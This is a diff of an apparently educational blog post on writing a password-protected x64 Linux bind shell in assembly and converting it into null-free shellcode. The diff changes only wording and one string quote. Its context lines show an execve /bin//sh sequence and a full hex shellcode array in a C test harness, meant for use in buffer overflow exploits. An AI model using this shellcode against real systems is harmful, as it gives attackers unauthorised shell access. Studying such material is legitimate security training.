@@ -264,7 +264,7 @@ syscall
 
 <h3>Stage 6 - Wait for input (password) to be received and compare it against the correct password string</h3>
 
-For this step, we will move our known password string, in reverse order, into a register and compare the string with whatever is passed back from the incoming connection. This operation is strictly 8 bytes and not the 16 bytes that we had in our C program (This is an area of improvement for future Assembly). If the two strings do not match, we jump to our 'exit' call and exit the program. Another important attribute of the 64-bit architecture is that it is little-endian, which basically means it will retrieve objects in reverse order. This effectively means that if we want to pass the string '8bytesss', then we need to pass it as'sssetyb8' and in hex format. We can use python to retrieve our reverse order hex value for the 8 byte password we want to use:
+For this step, we will move our known password string, in reverse order, into a register and compare the string with whatever is passed back from the incoming connection. This operation is strictly 8 bytes and not the 16 bytes that we had in our C program (This is an area of improvement for future Assembly). If the two strings do not match, we jump to our 'exit' call and exit the program. Another important attribute of the 64-bit architecture is that it is little-endian, which basically means it will retrieve objects in reverse order. This effectively means that if we want to pass the string '8bytesss', then we need to pass it as 'sssetyb8' and in hex format. We can use python to retrieve our reverse order hex value for the 8 byte password we want to use:
 
 ```python
 >>> password = '8bytesss'
@@ -351,7 +351,7 @@ push rax ;push 8 zero bytes onto the stack for third argument
 mov rbx, 0x68732f2f6e69622f ;move the /bin//sh string to rbx register
 push rbx ;push the value onto the stack
 
-mov rdi, rsp ;the stack pointer now points to the address of /bin//sh and 8 zero bytes on the stack so lets move that to rdi for first argument
+mov rdi, rsp ;the stack pointer now points to /bin//sh on the stack for first argument
 
 push rax ; Lets add another 8 zero bytes on the stack
 
@@ -363,7 +363,7 @@ mov rax, 59 ;syscall number for execve
 syscall ;execve syscall instruction
 ```
 
-Ok, that last part was quite a confusing bit, but after a few times you should get it.
+Ok, that last part was quite a confusing bit, but after going over it a few times you should get it.
 
 And that's it, we can now compile and run it and we should be presented with the same capabilities of our C program.
 
@@ -390,7 +390,7 @@ kali
 
 We could just stop here and call our Assembly code a success but our final goal is to generate shellcode that will be usable if we ever come across a buffer overflow vulnerability for example. So let's see how our code holds up as shellcode.
 
-We can easily extract all the shellcode from our compiled binary with a little bit of bash scripting, as is shown below:
+We can easily extract all the shellcode from our compiled binary with a little bit of bash scripting and the help of objdump, as is shown below:
 
 ```bash
 ┌──(kali㉿kali)-[~/pass_bind_nasm]
@@ -461,7 +461,7 @@ Shellcode Length:  3
 
 <h2>Removing null bytes from generated shellcode</h2>
 
-We can easily see which instructions are null byte culprits by using object dump and searching for '00'. So having a look at the below it is clear that the problem is mostly our 'mov' commands.
+We can easily see which instructions are null byte culprits by using object dump (objdump) and searching for '00'. So having a look at the below it is clear that the problem is mostly our 'mov' commands.
 
 ```bash
 ┌──(kali㉿kali)-[~/pass_bind_nasm]
@@ -541,7 +541,6 @@ mov word [rsp-8], 0x2 --> mov byte [rsp-8], 0x2
 There we go, we rid our Assembly code of all null bytes. Let's see if it will execute in our C wrapper now:
 
 ```c
-
 #include<stdio.h>
 #include<string.h>
 
@@ -552,7 +551,7 @@ unsigned char code[] = \
 \x49\x89\xc1\xb0\x03\x0f\x05\xb0\x21\x4c\x89\xcf\x48\x89\xde\x0f\x05\xb0\x21\x40\xb6\x01\x0f\x05\xb0\x21\x40
 \xb6\x02\x0f\x05\x48\x31\xc0\x41\x52\x48\x89\xe6\x48\x31\xd2\xb2\x08\x0f\x05\x48\x31\xc0\x48\xb8\x38\x62\x79
 \x74\x65\x73\x73\x73\x48\x89\xf7\x48\xaf\x75\x1e\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53
-\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\x3c\x0f\x05;
+\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\x3c\x0f\x05";
 
 int main()
 {
@@ -573,5 +572,5 @@ Shellcode Length:  184
 
 That looks a lot better. We have now effectively optimized our Assembly code and it is ready to be used as shellcode.
 
-The complete Assembly code and shellcode can be found [here](https://github.com/J33R4FF3/Pass_Bind_Shell) as Pass_Bind_Shell.nasm and Shellcode. 
+The complete Assembly code and shellcode can be found [here](https://github.com/J33R4FF3/Pass_Bind_Shell) as Pass_Bind_Shell.nasm and Shellcode respectively. 
 
